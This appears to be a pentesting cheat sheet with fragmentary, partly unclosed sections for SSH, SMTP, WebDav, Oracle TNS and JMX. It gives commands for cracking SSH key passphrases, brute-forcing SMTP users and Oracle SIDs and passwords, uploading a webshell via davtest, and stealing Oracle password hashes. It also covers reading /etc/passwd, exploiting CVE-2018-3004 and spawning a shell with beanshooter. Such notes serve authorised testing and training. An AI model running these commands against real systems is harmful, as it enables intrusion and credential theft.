```sh
# Login with password
ssh <username>@<ip> # then type password

# Login with private key
ssh -i id_rsa <username>@<ip> # If private_key has passphrase you need to type it

# Crack passphrase
python ssh2john.py id_rsa > id_rsa.hash

**Tips**

* If you use kali it is configured for Strong Security. You can easily configure "wide compatibility" (legacy key exchange algorithms and old ciphers enabled) with `kali-tweaks` -> Hardening menu -> Wide Compatibility. More info: [https://www.kali.org/docs/general-use/ssh-configuration/#ssh-client-wide-compatibility-vs-strong-security](https://www.kali.org/docs/general-use/ssh-configuration/#ssh-client-wide-compatibility-vs-strong-security)
* If login with private key fails and you're asked for your user password, check for some errors (`-vv` option). Make sure that the public key is added in the `authorized_keys` file.

## <mark style="color:purple;">25 - SMTP</mark>

* Search exploit for vulnerable version
* Retrieve the hostname of the server (domain name)
  * ```sh
    francesco@debian:~$ nc <ip> <port>
    220 openmailbox.xyz ESMTP Postfix: Welcome.    # Here (in the banner)
    helo whatyouwant                               # helo command
    250 openmailbox.xyz                            # Here
    ```
* Username Bruteforce
  *   Automation:

      ```sh
      smtp-user-enum -U <wordlist> -t <ip>
      ```
  *   Manual

      ```sh
      francesco@debian:~$ nc <ip> <port>

## <mark style="color:purple;">80 - WebDav</mark>

* With WebDav you can upload file. Normally it's necessary credentials
  * Bruteforce (it's simple HTTP Basic Authentication)
* You can automate the upload and execution of file

# Check what file type is executed
davtest -auth <user>:<password> -url http://<ip>/<webdav_path>
# Upload file
davtest --url http://<ip>/<webdav_path> -auth <user>:<password> -uploadfile webshell.asp -uploadloc /destination/webshell.asp

## <mark style="color:purple;">1521 - ORACLE DB (TNS protocol)</mark>

<details>

<summary>INTRODUCTION</summary>

Oracle clients communicate with the database using the TNS protocol

In Oracle DB a **SID** is specific to a database, it is unique in an environment and 'points' to one, and only one, database in an environment. A **service name** can be associated with one or more SIDs.

In a RAC environment where each instance is uniquely named yet all can be accessed through the SERVICE\_NAME. \[Oracle Real Application Cluster (**RAC**) is a "share-everything" database architecture in which two or more Oracle RAC nodes are clustered together and share the same memory]

```
SID        SERVICE_NAME
test1      test
test2      test
```

All of those SIDs can be associated with the SERVICE\_NAME test, and if load balancing is configured, the listener will 'balance' the workload across all SIDs. However, if you want, you can connect to test1, you just need to NOT use the SERVICE\_NAME and use the SID.

</details>

```sh
# Oracle DB version
odat tnscmd -s <ip> --version

# Search valid SIDs (with default wordlist and bruteforce [default max-size 2 chars])
odat sidguesser -s <ip>

# Search valid SIDs with custom sids wordlist
odat sidguesser -s <ip> --sids-file sids.txt

# Search valid SNs (with default wordlist and bruteforce [default max-size 2 chars])
odat snguesser -s <ip>

# Search valid SNs with custom SNs wordlist
odat snguesser -s <ip> --service-name-file sn.txt
```

**Find user credentials**

* \[CVE-2012-3137] You need a valid SID and Oracle DB version is one of this (10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, 11.2.0.3) you can obtain the session key and salt for arbitrary users.
* \[Guess password] You need SID or SN

<pre class="language-sh"><code class="lang-sh"><strong># Guess password with SID/SN using default odat credentials
</strong>odat passwordguesser -s &#x3C;ip> -d &#x3C;SID>
odat passwordguesser -s &#x3C;ip> -n &#x3C;SN>
</code></pre>

**Analyze database**

```sh
# enumerate database
odat search -s <ip> -d <SID> -p <port> -U <username> -P <password>  --basic-info
# open sql shell
odat search -s <ip> -d <SID> -p <port> -U <username> -P <password>  --sql-shell
# get hashed password when the account is not locked
odat passwordstealer -s <IP> -d <SID> -p <port> -U mobius -P <password> --get-passwords-not-locked
# read file (ex. ssh private key)
odat externaltable -s <IP> -d <SID> -p <port> -U mobius -P <password> --getFile /etc passwd passwd
# create file with cve-2018-3004 (ex. upload authorized key)
odat cve -s <IP> -d <SID> -p <port> -U mobius -P <password> --cve-2018-3004 /tmp/test "test"

# NOTE: there are many other things and techniques you can use with odat. Refer to the documentation

# Creating a TemplateImpl payload object to abuse StandardMBean
beanshooter standard <ip> <jmx_port> tonka
# Spawns a shell. NOTE: this works even if the target host doesn't reach you

**Beanshooter Tips**

* If your local Java version is higher than the Java version of the application server, the server cannot load the bytecode and throws an exception.
* How to know what java version the server is running? Connect with jconsole, then go to "VM Summary", find "VM Arguments" and search "Boot class path".
* Install with maven

## <mark style="color:purple;">Other ports</mark>

Most of the services identified by the Nmap scan are easily recognizable, however, it's possibile that there are a few open ports on a target system that do not have a service banner. To learn more about these port and the service running, we can perform banner grabbing with Netcat

```sh
netcat <ip> <port>
```
